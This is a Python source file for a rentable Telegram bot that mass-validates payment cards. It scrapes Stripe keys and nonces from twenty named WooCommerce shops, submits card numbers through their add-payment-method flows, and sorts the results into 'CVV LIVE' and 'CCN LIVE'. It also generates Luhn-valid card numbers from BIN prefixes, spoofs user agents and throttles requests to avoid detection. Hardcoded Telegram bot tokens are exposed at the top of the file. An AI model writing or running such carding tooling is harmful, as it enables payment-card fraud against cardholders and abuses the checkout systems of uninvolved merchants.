import requests
import re
import uuid
import time
import logging
import random
import os
import json
import threading
import asyncio
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from datetime import datetime, timedelta
from html import escape
import aiohttp
from queue import Queue
from fake_useragent import UserAgent
from urllib.parse import urlencode, urljoin

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot configuration
BOT_TOKEN = "7455342894:AAEJZQdAcICd13uimGrUH1EVIRV1M36uyF8"
ADMIN_ID = "6764941964"

# LOGGING BOT CONFIGURATION - Separate bot for error logs
LOGS_BOT_TOKEN = "8389604020:AAHLgIqB3tapLL98F-qZvXi-2dADakCbjfs"
LOGS_CHAT_ID = "6764941964"

# BIN API Configuration
BIN_API_URL = "https://isnotsin.com/bin-info/api?bin="

# OPTIMIZED: Better thread pool configuration for HIGH multi-user performance
GLOBAL_MAX_WORKERS = 50  # Reduced to prevent resource exhaustion
USER_MAX_WORKERS = 2
REQUEST_TIMEOUT = 15  # Increased timeout
TELEGRAM_TIMEOUT = 10
MAX_CONCURRENT_USERS = 5

# List of authorized user IDs
AUTHORIZED_USERS = [
    "6764941964",
]

# File to store rental data
RENTAL_DATA_FILE = "rentals.json"

# User info cache
user_info_cache = {}

# Track site errors to avoid spam
site_errors = {}
MAX_ERROR_REPORTS_PER_HOUR = 2

# OPTIMIZED: Global thread pool with better resource management
global_thread_pool = ThreadPoolExecutor(max_workers=GLOBAL_MAX_WORKERS, thread_name_prefix="GlobalWorker")

# User sessions - supports multiple users
user_sessions = {}

# Active user management with better concurrency control
active_users_lock = threading.RLock()  # Changed to RLock for better synchronization
active_users_count = 0
user_queues = {}

# Initialize fake UserAgent
try:
    ua = UserAgent()
    logger.info("✅ Fake UserAgent initialized successfully")
except Exception as e:
    logger.error(f"❌ Failed to initialize fake UserAgent: {e}")
    ua = None

# Fallback user agents list
FALLBACK_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
]

# Load rental data from file
def load_rental_data():
    try:
        if os.path.exists(RENTAL_DATA_FILE):
            with open(RENTAL_DATA_FILE, 'r') as f:
                data = json.load(f)
                return {user_id: float(expiry) for user_id, expiry in data.items()}
        return {}
    except Exception as e:
        logger.error(f"Error loading rental data: {e}")
        return {}

# Save rental data to file
def save_rental_data():
    try:
        with open(RENTAL_DATA_FILE, 'w') as f:
            data = {user_id: str(expiry) for user_id, expiry in USER_RENTALS.items()}
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving rental data: {e}")

# Rental system - stores user_id: expiry_timestamp
USER_RENTALS = load_rental_data()

# List of target sites
API_URLS = [
    "https://yayfoods.com.au/my-account/add-payment-method/",
    "https://laseraesthetics.co.nz/my-account/add-payment-method/",
    "https://feelforhair.co.uk/my-account/add-payment-method/",
    "https://rawpassion.com.au/my-account/add-payment-method/",
    "https://totbop.co.uk/my-account/add-payment-method/",
    "https://pacande.com/my-account/add-payment-method/",
    "https://happymuz.com.au/my-account/add-payment-method/",
    "https://shackletonsonline.co.uk/my-account/add-payment-method/",
    "https://mobileframing.com.au/my-account/add-payment-method/",
    "https://paulmanwaring.com/my-account/add-payment-method/",
    "https://farmgalore.ie/my-account/add-payment-method/",
    "https://jamesportwines.com/my-account/add-payment-method/",
    "https://flamessteakhouse.co.uk/my-account/add-payment-method/",
    "https://langtonbrewery.co.uk/my-account/add-payment-method/",
    "https://sponsoredadrenaline.com/my-account/add-payment-method/",
    "https://hanstrom.com/my-account/add-payment-method/",
    "https://maceindustries.co.uk/my-account/add-payment-method/",
    "https://nickjennings.ca.uk/my-account/add-payment-method/",
    "https://greenfoodsagri.com/my-account/add-payment-method/",
    "https://nelsonpilates.com/my-account/add-payment-method/",
]

# Maximum cards limit
MAX_CARDS_LIMIT = 500

# OPTIMIZED: Connection pooling with session reuse for HIGH performance
def create_session():
    """Create a requests session with connection pooling"""
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=20,  # Reduced to prevent connection exhaustion
        pool_maxsize=100,
        max_retries=2,  # Increased retries
        pool_block=False
    )
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# Global session for connection pooling
global_session = create_session()

# UPDATED: Pure results only - only real CVV Live and CCN Live count as live
def parse_stripe_response(response_text):
    resp_lower = response_text.lower()
    
    # ONLY REAL CVV LIVE - Transaction succeeded
    if any(msg in resp_lower for msg in ["succeeded", "payment complete", "setup_intent_succeeded"]):
        return {'status': 'cvv_live', 'rawMessage': 'CVV LIVE: Transaction Succeeded'}
    
    # ONLY REAL CCN LIVE - Wrong CVV but valid card
    if any(msg in resp_lower for msg in ["incorrect_cvc", "security code is incorrect"]):
        return {'status': 'ccn_live', 'rawMessage': 'CCN LIVE: Incorrect CVC'}
    
    # EVERYTHING ELSE IS DECLINED (including insufficient funds and 3ds/otp)
    if any(msg in resp_lower for msg in ["insufficient_funds", "3ds", "authentication", "otp", "verification", "challenge"]):
        return {'status': 'declined', 'rawMessage': 'Declined'}
    
    if any(msg in resp_lower for msg in ["address_zip_check", "postal_code_invalid"]):
        return {'status': 'declined', 'rawMessage': 'Declined: AVS Mismatch'}
    
    if any(msg in resp_lower for msg in ["card_declined", "declined", "do_not_honor", "do not honor", "not honored"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Card declined'}
    
    if any(msg in resp_lower for msg in ["invalid_number", "invalid card", "incorrect_number"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Invalid card number'}
    
    if any(msg in resp_lower for msg in ["expired_card", "expired"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Card expired'}
    
    if any(msg in resp_lower for msg in ["pickup_card", "stolen_card", "lost_card"]):
        return {'status': 'declined', 'rawMessage': 'Declined: Card reported lost/stolen'}
    
    # DEFAULT TO DECLINED
    return {'status': 'declined', 'rawMessage': 'Declined: No positive indicators'}

def fetch_nonce_and_key(url):
    try:
        res = global_session.get(url, timeout=10)  # Increased timeout
        res.raise_for_status()
        html = res.text
        nonce_match = (re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html) or re.search(r'"_ajax_nonce":"([a-f0-9]{10,})"', html) or re.search(r'name="woocommerce-process-checkout-nonce" value="([a-f0-9]{10,})"', html))
        key_match = re.search(r'(pk_live_[A-Za-z0-9_]+)', html)
        nonce = nonce_match.group(1) if nonce_match else None
        key = key_match.group(1) if key_match else None
        
        if not nonce or not key:
            site_name = url.split('//')[-1].split('/')[0]
            error_msg = f"<b>Mass Check Gateway Error</b>\n\n🌐 <b>Site:</b> {site_name}\n❌ <b>Error:</b> Missing Key/Nonce\n⏰ <b>Time:</b> {datetime.now().strftime('%I:%M %p')}\n\n🔧 <i>Site may need maintenance</i>"
            send_error_log_sync(error_msg)
        
        return {'nonce': nonce, 'key': key}
    except requests.exceptions.RequestException as e:
        site_name = url.split('//')[-1].split('/')[0]
        error_msg = f"<b>Mass Check Gateway Error</b>\n\n🌐 <b>Site:</b> {site_name}\n❌ <b>Error:</b> Connection Failed - {str(e)}\n⏰ <b>Time:</b> {datetime.now().strftime('%I:%M %p')}\n\n🔧 <i>Site may be down</i>"
        send_error_log_sync(error_msg)
        return {'nonce': None, 'key': None}

# FIXED: UserCardProcessor with better error handling and resource management
class UserCardProcessor:
    def __init__(self, user_session):
        self.user_session = user_session
        self.card_queue = Queue()
        self.results_queue = Queue()
        self.processing = False
        self.workers = []
        self.approved_cards = []
        self.processing_lock = threading.Lock()
        
    def start_processing(self, cards):
        """Start processing cards for this user"""
        with self.processing_lock:
            self.processing = True
            self.approved_cards = []
            
            # Add all cards to queue
            for card in cards:
                self.card_queue.put(card)
                
            # Start worker threads for this user
            for i in range(USER_MAX_WORKERS):
                worker = threading.Thread(
                    target=self._card_worker, 
                    args=(i,),
                    daemon=True,
                    name=f"UserWorker_{self.user_session['chat_id']}_{i}"
                )
                worker.start()
                self.workers.append(worker)
                
    def stop_processing(self):
        """Stop processing for this user"""
        with self.processing_lock:
            self.processing = False
            # Clear the queue
            while not self.card_queue.empty():
                try:
                    self.card_queue.get_nowait()
                except:
                    pass
            self.workers.clear()
            
    def _card_worker(self, worker_id):
        """Worker thread to process cards for this user"""
        headers = prepare_headers()
        
        while self.processing and not self.card_queue.empty():
            try:
                # Add delay between requests to avoid detection
                time.sleep(0.5)  # Increased delay
                
                card = self.card_queue.get(timeout=1.0)  # Increased timeout
                if card is None:
                    break
                    
                # Process the card
                self._process_single_card(card, headers, worker_id)
                self.card_queue.task_done()
                
            except Exception as e:
                continue
                
    def _process_single_card(self, card, headers, worker_id):
        """Process a single card - MODIFIED: No live notifications"""
        if not self.user_session.get("checking", False):
            return
            
        try:
            # Update current card info for display
            self.user_session["current_card_info"] = {"card": card}
            
            # Parse card details
            try:
                card_parts = card.split('|')
                if len(card_parts) < 4:
                    with active_users_lock:
                        self.user_session["stats"]["declined"] += 1
                        self.user_session["current_index"] += 1
                    return
                    
                number, exp_month, exp_year, cvv = card_parts[:4]
                exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
            except:
                with active_users_lock:
                    self.user_session["stats"]["declined"] += 1
                    self.user_session["current_index"] += 1
                return

            # Get site and nonce/key
            site_url = random.choice(API_URLS)
            result = fetch_nonce_and_key(site_url)
            nonce = result['nonce']
            key = result['key']
            
            if not nonce or not key:
                with active_users_lock:
                    self.user_session["stats"]["declined"] += 1
                    self.user_session["current_index"] += 1
                return
                
            # Prepare Stripe data
            uuids = generate_uuids()
            stripe_data = {
                'type': 'card',
                'card[number]': number,
                'card[cvc]': cvv,
                'card[exp_year]': exp_year,
                'card[exp_month]': exp_month,
                'guid': uuids["gu"],
                'muid': uuids["mu"],
                'sid': uuids["si"],
                'key': key,
                '_stripe_version': '2024-06-20',
            }
            
            # Get payment method ID from Stripe
            try:
                stripe_response = global_session.post(
                    "https://api.stripe.com/v1/payment_methods", 
                    headers=headers, 
                    data=stripe_data, 
                    verify=False, 
                    timeout=REQUEST_TIMEOUT
                )
                
                if stripe_response.status_code == 200:
                    stripe_data_response = stripe_response.json()
                    payment_method_id = stripe_data_response.get('id')
                    
                    # Check for Stripe-level errors first
                    if stripe_data_response.get('error'):
                        error_code = stripe_data_response['error'].get('code', '')
                        error_message = stripe_data_response['error'].get('message', '')
                        
                        # Map Stripe errors directly
                        if error_code in ['invalid_number', 'incorrect_number']:
                            with active_users_lock:
                                self.user_session["stats"]["declined"] += 1
                                self.user_session["current_index"] += 1
                            return
                        elif error_code in ['invalid_cvc', 'incorrect_cvc']:
                            # This is CCN live - card is valid but CVV wrong
                            with active_users_lock:
                                self.user_session["stats"]["ccn_live"] += 1
                            self._save_live_card(card, 'CCN LIVE: Incorrect CVC', 'CCN')
                            bin_info = fetch_bin_info(number)
                            approved_card_info = {
                                'card': card,
                                'status': 'ccn_live',
                                'message': 'CCN LIVE: Incorrect CVC',
                                'bin_info': bin_info
                            }
                            with self.processing_lock:
                                self.approved_cards.append(approved_card_info)
                            with active_users_lock:
                                self.user_session["current_index"] += 1
                            return
                        elif error_code in ['expired_card']:
                            with active_users_lock:
                                self.user_session["stats"]["declined"] += 1
                                self.user_session["current_index"] += 1
                            return
                        elif error_code in ['card_declined']:
                            with active_users_lock:
                                self.user_session["stats"]["declined"] += 1
                                self.user_session["current_index"] += 1
                            return
                        else:
                            # Other Stripe errors treated as declined
                            with active_users_lock:
                                self.user_session["stats"]["declined"] += 1
                                self.user_session["current_index"] += 1
                            return
                    
                    if not payment_method_id:
                        with active_users_lock:
                            self.user_session["stats"]["declined"] += 1
                            self.user_session["current_index"] += 1
                        return
                else:
                    # Stripe API call failed
                    with active_users_lock:
                        self.user_session["stats"]["declined"] += 1
                        self.user_session["current_index"] += 1
                    return
                    
            except Exception as e:
                with active_users_lock:
                    self.user_session["stats"]["declined"] += 1
                    self.user_session["current_index"] += 1
                return

            # Prepare setup data
            setup_data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }
            
            # Get BIN info from API
            bin_info = fetch_bin_info(number)
            
            # Confirm setup intent
            try:
                confirm_response = global_session.post(
                    site_url, 
                    params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, 
                    headers=headers, 
                    data=setup_data, 
                    verify=False, 
                    timeout=REQUEST_TIMEOUT
                )
                if confirm_response.status_code == 200:
                    response_text = confirm_response.text
                    
                    # Parse the response using the FIXED function
                    result = parse_stripe_response(response_text)
                    
                    # Track approved cards - ONLY CVV_LIVE and CCN_LIVE are considered "approved"
                    if result['status'] == 'cvv_live':
                        with active_users_lock:
                            self.user_session["stats"]["cvv_live"] += 1
                        self._save_live_card(card, result['rawMessage'], 'AUTH')
                        approved_card_info = {
                            'card': card,
                            'status': 'cvv_live',
                            'message': result['rawMessage'],
                            'bin_info': bin_info
                        }
                        with self.processing_lock:
                            self.approved_cards.append(approved_card_info)
                            
                    elif result['status'] == 'ccn_live':
                        with active_users_lock:
                            self.user_session["stats"]["ccn_live"] += 1
                        self._save_live_card(card, result['rawMessage'], 'CCN')
                        approved_card_info = {
                            'card': card,
                            'status': 'ccn_live',
                            'message': result['rawMessage'],
                            'bin_info': bin_info
                        }
                        with self.processing_lock:
                            self.approved_cards.append(approved_card_info)
                        
                    # EVERYTHING ELSE IS DECLINED
                    else:
                        with active_users_lock:
                            self.user_session["stats"]["declined"] += 1
                        self._save_declined_card(card, result)
                else:
                    with active_users_lock:
                        self.user_session["stats"]["declined"] += 1
                    
            except Exception as e:
                with active_users_lock:
                    self.user_session["stats"]["declined"] += 1
                
        except Exception as e:
            with active_users_lock:
                self.user_session["stats"]["declined"] += 1
        
        with active_users_lock:
            self.user_session["current_index"] += 1
            self.user_session["current_card_info"] = None
        
    def get_approved_cards(self):
        """Get the list of approved cards"""
        with self.processing_lock:
            return self.approved_cards.copy()
            
    def _save_live_card(self, card, message, card_type):
        """Save live card to file"""
        try:
            with open(f'{card_type}_{self.user_session["chat_id"]}.txt', 'a') as f:
                f.write(f"{card} | {message}\n")
        except Exception as e:
            logger.error(f"Error saving {card_type} card: {e}")
            
    def _save_declined_card(self, card, result):
        """Save declined card to file"""
        try:
            with open(f'DECLINED_{self.user_session["chat_id"]}.txt', 'a') as f:
                f.write(f"{card} | {result['rawMessage']}\n")
        except Exception as e:
            logger.error(f"Error saving declined card: {e}")

# NEW FUNCTION: Create approved cards results file
def create_approved_cards_file(user_session, approved_cards):
    """Create results.txt file with approved cards in the exact format"""
    try:
        chat_id = user_session["chat_id"]
        filename = f"results_{chat_id}.txt"
        
        with open(filename, 'w') as f:
            f.write("APPROVED CARDS RESULTS\n")
            f.write("=" * 50 + "\n")
            f.write(f"Total Approved: {len(approved_cards)}\n")
            f.write(f"CVV Live: {sum(1 for card in approved_cards if card['status'] == 'cvv_live')}\n")
            f.write(f"CCN Live: {sum(1 for card in approved_cards if card['status'] == 'ccn_live')}\n")
            f.write("=" * 50 + "\n\n")
            
            for card_info in approved_cards:
                card = card_info['card']
                status = card_info['status']
                
                status_label = {
                    'cvv_live': 'CVV LIVE',
                    'ccn_live': 'CCN LIVE'
                }.get(status, 'APPROVED')
                
                f.write(f"{card} | {status_label}\n")
        
        return filename
    except Exception as e:
        logger.error(f"Error creating approved cards file: {e}")
        return None

# NEW FUNCTION: Send approved cards file only
def send_approved_cards_file(user_session, approved_cards):
    """Send only the approved cards file with exact format"""
    try:
        chat_id = user_session["chat_id"]
        total_approved = len(approved_cards)
        
        # Only send file if there are approved cards
        if total_approved > 0:
            # Create approved cards file
            approved_filename = create_approved_cards_file(user_session, approved_cards)
            
            if approved_filename and os.path.exists(approved_filename):
                try:
                    with open(approved_filename, 'rb') as f:
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                        files = {'document': (approved_filename, f)}
                        data = {
                            'chat_id': chat_id,
                            'caption': f"✅ Approved Cards: {total_approved}"
                        }
                        response = global_session.post(url, files=files, data=data, timeout=TELEGRAM_TIMEOUT)
                    
                    # Clean up file after sending
                    try:
                        os.remove(approved_filename)
                    except:
                        pass
                        
                except Exception as file_error:
                    logger.error(f"Error sending approved cards file: {file_error}")
            
    except Exception as e:
        logger.error(f"Error sending approved cards file: {e}")

# MODIFIED: Build keyboard without insufficient funds and 3DS/OTP
def build_keyboard(task_id, counts, current_card_info):
    """Builds the inline keyboard for the mass check UI."""
    status = counts.get('status', 'Running')
    
    if status == 'Completed':
        status_text = f"✅ {status}"
    elif status == 'Stopped':
        status_text = f"🛑 {status}"
    else:
        status_text = f"🔄 {status}"
    
    buttons = [
        [InlineKeyboardButton(f"• {status_text}", callback_data='noop')],
        [InlineKeyboardButton(f"🟢 CVV LIVE → [ {counts['cvv_live']} ]", callback_data='noop')],
        [InlineKeyboardButton(f"🔵 CCN LIVE → [ {counts['ccn_live']} ]", callback_data='noop')],
        [InlineKeyboardButton(f"❌ DECLINED → [ {counts['declined']} ]", callback_data='noop')],
        [InlineKeyboardButton(f"🔄 TOTAL → [ {counts['total']} ]", callback_data='noop')],
        [InlineKeyboardButton(" [ STOP ] ", callback_data=f'stop_masschk_{task_id}')]
    ]
    
    if current_card_info and status == 'Running':
        card_display = current_card_info.get('display', '')
        if card_display:
            buttons.insert(1, [InlineKeyboardButton(f" {card_display}", callback_data='noop')])
    
    return InlineKeyboardMarkup(buttons)

# FIXED: checking_thread with better error handling and resource management
def checking_thread(user_session):
    """Optimized checking thread that sends approved cards file after completion"""
    try:
        # Mark user as active
        with active_users_lock:
            global active_users_count
            active_users_count += 1
            user_session["active"] = True
            logger.info(f"User {user_session['chat_id']} started checking. Active users: {active_users_count}")
        
        # Send initial progress update
        update_progress_message_sync(user_session)
        
        # Create card processor for this user
        processor = UserCardProcessor(user_session)
        user_session["processor"] = processor
        
        # Start processing cards
        processor.start_processing(user_session["cards"])
        
        # Monitor progress without blocking
        total_cards = len(user_session["cards"])
        last_update_time = time.time()
        update_interval = 2.0
        
        while (user_session.get("checking", False) and 
               user_session["current_index"] < total_cards and
               processor.processing):
            
            # Update progress periodically
            current_time = time.time()
            if current_time - last_update_time >= update_interval:
                update_progress_message_sync(user_session)
                last_update_time = current_time
                
            time.sleep(0.5)  # Increased sleep to reduce CPU usage
            
        # MODIFIED: Send approved cards file after completion
        if user_session.get("checking", False):
            # Get approved cards from processor
            approved_cards = processor.get_approved_cards()
            
            # Update progress with final results
            update_progress_message_sync(user_session)
            
            # Send approved cards file (no live notifications, just the file)
            send_approved_cards_file(user_session, approved_cards)
            
            # Send final results
            send_final_results_sync(user_session)
            
    except Exception as e:
        logger.error(f"Error in checking_thread: {e}")
        # Send error update
        try:
            stats = user_session["stats"]
            total = stats["total"]
            chat_id = user_session["chat_id"]
            task_id = user_session["task_id"]
            
            error_counts = {
                'status': 'Error',
                'cvv_live': stats['cvv_live'],
                'ccn_live': stats['ccn_live'],
                'declined': stats['declined'],
                'total': total,
                'current': user_session["current_index"]
            }
            
            error_message = "❌ Processing Error"
            
            if user_session["message_id"]:
                edit_telegram_message_sync(
                    error_message, 
                    chat_id, 
                    user_session["message_id"],
                    reply_markup=build_keyboard(task_id, error_counts, None)
                )
        except Exception as update_error:
            logger.error(f"Error updating error message: {update_error}")
    finally:
        # Clean up processor
        if user_session.get("processor"):
            user_session["processor"].stop_processing()
            
        # Mark user as inactive
        with active_users_lock:
            active_users_count -= 1
            user_session["active"] = False
            user_session["checking"] = False
            logger.info(f"User {user_session['chat_id']} finished checking. Active users: {active_users_count}")

# Luhn algorithm functions
def luhn_checksum(card_number):
    """Calculate Luhn checksum for a card number"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def is_luhn_valid(card_number):
    """Check if card number passes Luhn validation"""
    return luhn_checksum(card_number) == 0

def calculate_luhn_check_digit(partial_card_number):
    """Calculate the Luhn check digit for a partial card number"""
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(partial_card_number + '0')
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    
    return (10 - (checksum % 10)) % 10

def generate_valid_card(custom_prefix, length=16):
    """Generate a valid card number with custom prefix and Luhn check digit"""
    # Remove any spaces or dashes from custom prefix
    custom_prefix = custom_prefix.replace(' ', '').replace('-', '')
    
    # Generate random middle digits
    remaining_length = length - len(custom_prefix) - 1  # -1 for check digit
    if remaining_length < 0:
        raise ValueError("Custom prefix too long for card length")
    
    middle_digits = ''.join([str(random.randint(0, 9)) for _ in range(remaining_length)])
    partial_card = custom_prefix + middle_digits
    
    # Calculate Luhn check digit
    check_digit = calculate_luhn_check_digit(partial_card)
    
    return partial_card + str(check_digit)

def generate_cards(custom_prefix, count=10, length=16):
    """Generate multiple valid card numbers with custom prefix and Luhn validation"""
    cards = []
    for _ in range(count):
        try:
            card_number = generate_valid_card(custom_prefix, length)
            if is_luhn_valid(card_number):
                cards.append(card_number)
        except ValueError as e:
            logger.error(f"Error generating card: {e}")
            continue
    
    return cards

def generate_random_expiry():
    """Generate random month and year"""
    # Random month (1-12)
    month = random.randint(1, 12)
    month_str = f"{month:02d}"
    
    # Random year (current year to current year + 5)
    current_year = datetime.now().year
    year = random.randint(current_year, current_year + 5)
    year_str_4d = str(year)
    year_str_2d = str(year)[-2:]
    
    return month_str, year_str_4d, year_str_2d

# OPTIMIZED: Faster user info fetching with caching
async def get_user_info(user_id):
    """Get username and first name for a user ID"""
    try:
        if user_id in user_info_cache:
            return user_info_cache[user_id]
        
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getChat"
        params = {'chat_id': user_id}
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.post(url, params=params) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('ok'):
                        user = data['result']
                        username = user.get('username', 'No username')
                        first_name = user.get('first_name', 'No name')
                        user_info = f"@{username}" if username != 'No username' else first_name
                        user_info_cache[user_id] = user_info
                        return user_info
    except Exception as e:
        logger.error(f"Error getting user info for {user_id}: {e}")
    
    return f"User_{user_id}"

def get_rental_days_left(expiry_timestamp):
    """Calculate days left for rental"""
    current_time = datetime.now().timestamp()
    if current_time >= expiry_timestamp:
        return 0
    time_left = expiry_timestamp - current_time
    days_left = int(time_left // 86400)
    return max(0, days_left)

def get_rental_time_left_detailed(expiry_timestamp):
    """Calculate detailed time left for rental (days, hours, minutes)"""
    current_time = datetime.now().timestamp()
    if current_time >= expiry_timestamp:
        return 0, 0, 0
    
    time_left = expiry_timestamp - current_time
    days = int(time_left // 86400)
    hours = int((time_left % 86400) // 3600)
    minutes = int((time_left % 3600) // 60)
    
    return days, hours, minutes

def send_error_log_sync(error_message):
    """Send error log to logging bot with rate limiting"""
    try:
        site_match = re.search(r'Gateway Error on (.*?):', error_message)
        if site_match:
            site_name = site_match.group(1)
            current_time = time.time()
            
            if site_name in site_errors:
                last_report_time, report_count = site_errors[site_name]
                if current_time - last_report_time < 3600:
                    if report_count >= MAX_ERROR_REPORTS_PER_HOUR:
                        logger.info(f"Rate limit reached for {site_name}, skipping error report")
                        return
                    site_errors[site_name] = (last_report_time, report_count + 1)
                else:
                    site_errors[site_name] = (current_time, 1)
            else:
                site_errors[site_name] = (current_time, 1)
        
        url = f"https://api.telegram.org/bot{LOGS_BOT_TOKEN}/sendMessage"
        params = {
            'chat_id': LOGS_CHAT_ID,
            'text': f"🚨 {error_message}",
            'parse_mode': 'HTML'
        }
        response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
        return response
    except Exception as e:
        logger.error(f"Error sending error log: {e}")
        return None

def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    user_id_str = str(user_id)
    
    if user_id_str in AUTHORIZED_USERS:
        return True
    
    if user_id_str in USER_RENTALS:
        expiry_time = USER_RENTALS[user_id_str]
        if datetime.now().timestamp() < expiry_time:
            return True
        else:
            del USER_RENTALS[user_id_str]
            save_rental_data()
            return False
    
    return False

def is_admin(user_id):
    """Check if user is admin"""
    return str(user_id) == ADMIN_ID

def get_rental_time_left(user_id):
    """Get remaining rental time in hours and minutes"""
    user_id_str = str(user_id)
    if user_id_str in USER_RENTALS:
        expiry_time = USER_RENTALS[user_id_str]
        current_time = datetime.now().timestamp()
        if current_time < expiry_time:
            time_left = expiry_time - current_time
            hours = int(time_left // 3600)
            minutes = int((time_left % 3600) // 60)
            return hours, minutes
    return 0, 0

def add_rental(user_id, days=1):
    """Add rental access for user"""
    user_id_str = str(user_id)
    expiry_time = datetime.now() + timedelta(days=days)
    USER_RENTALS[user_id_str] = expiry_time.timestamp()
    save_rental_data()
    return expiry_time

def remove_rental(user_id):
    """Remove rental access for user"""
    user_id_str = str(user_id)
    if user_id_str in USER_RENTALS:
        del USER_RENTALS[user_id_str]
        save_rental_data()
        return True
    return False

def cleanup_expired_rentals():
    """Remove expired rentals from the data"""
    current_time = datetime.now().timestamp()
    expired_users = []
    
    for user_id, expiry_time in USER_RENTALS.items():
        if current_time >= expiry_time:
            expired_users.append(user_id)
    
    for user_id in expired_users:
        del USER_RENTALS[user_id]
    
    if expired_users:
        save_rental_data()
        logger.info(f"Cleaned up {len(expired_users)} expired rentals")

# FIXED: Get user session with better resource management and thread safety
def get_user_session(chat_id):
    """Get or create user session with resource limits"""
    with active_users_lock:
        if chat_id not in user_sessions:
            user_sessions[chat_id] = {
                "checking": False,
                "cards": [],
                "current_index": 0,
                "stats": {
                    "cvv_live": 0,
                    "ccn_live": 0,
                    "declined": 0,
                    "total": 0
                },
                "start_time": None,
                "message_id": None,
                "chat_id": chat_id,
                "user_file": f"cc_{chat_id}.txt",
                "current_card_info": None,
                "task_id": str(uuid.uuid4())[:8],
                "processor": None,
                "active": False
            }
        return user_sessions[chat_id]

# FIXED: Check if system can handle more users with thread safety
def can_accept_new_user():
    """Check if system can accept new checking users"""
    with active_users_lock:
        active_count = active_users_count
        return active_count < MAX_CONCURRENT_USERS

# OPTIMIZED: Faster BIN lookup with connection pooling
def fetch_bin_info(card_number):
    """Fetch BIN info from API"""
    try:
        bin_number = card_number[:6]
        response = global_session.get(f"{BIN_API_URL}{bin_number}", timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            
            country_field = data.get('country', 'UNKNOWN COUNTRY')
            country_name = 'UNKNOWN COUNTRY'
            emoji = ''
            
            if isinstance(country_field, str):
                country_parts = country_field.split(' ')
                if country_parts and len(country_parts[-1].strip()) > 0:
                    last_part = country_parts[-1].strip()
                    if any(char in last_part for char in ['\ud83c', '\ud83d']):
                        emoji = last_part
                        country_name = ' '.join(country_parts[:-1]).strip() or 'UNKNOWN COUNTRY'
                    else:
                        country_name = country_field
                        emoji = ''
                else:
                    country_name = country_field
                    emoji = ''
            
            return {
                "BIN": data.get('bin', bin_number),
                "Brand": data.get('brand', 'UNKNOWN').upper(),
                "Type": data.get('type', 'UNKNOWN').upper(),
                "Level": data.get('level', 'UNKNOWN').upper(),
                "Bank": data.get('bank', 'UNKNOWN BANK'),
                "Country": country_name,
                "Emoji": emoji
            }
    except Exception as e:
        logger.error(f"Error fetching BIN info from API: {e}")
    
    return {
        "BIN": card_number[:6],
        "Brand": "UNKNOWN",
        "Type": "UNKNOWN",
        "Level": "UNKNOWN",
        "Bank": "UNKNOWN BANK",
        "Country": "UNKNOWN COUNTRY",
        "Emoji": ""
    }

def send_telegram_message_sync(message, chat_id, parse_mode='HTML', reply_markup=None):
    """Sync version of telegram message sending with better error handling"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        params = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': parse_mode
        }
        if reply_markup:
            params['reply_markup'] = reply_markup.to_json()
        response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
        
        # Log if there's an error
        if response.status_code != 200:
            logger.warning(f"Failed to send message to chat {chat_id}: {response.text}")
            
        return response
    except Exception as e:
        logger.error(f"Error sending message: {e}")
        return None

def edit_telegram_message_sync(message, chat_id, message_id, parse_mode='HTML', reply_markup=None):
    """Sync version of telegram message editing with better error handling"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        params = {
            'chat_id': chat_id,
            'message_id': message_id,
            'text': message,
            'parse_mode': parse_mode
        }
        if reply_markup:
            params['reply_markup'] = reply_markup.to_json()
        response = global_session.post(url, json=params, timeout=TELEGRAM_TIMEOUT)
        
        # Log if there's an error
        if response.status_code != 200:
            logger.warning(f"Failed to edit message {message_id} for chat {chat_id}: {response.text}")
            
        return response
    except Exception as e:
        logger.error(f"Error editing message: {e}")
        return None

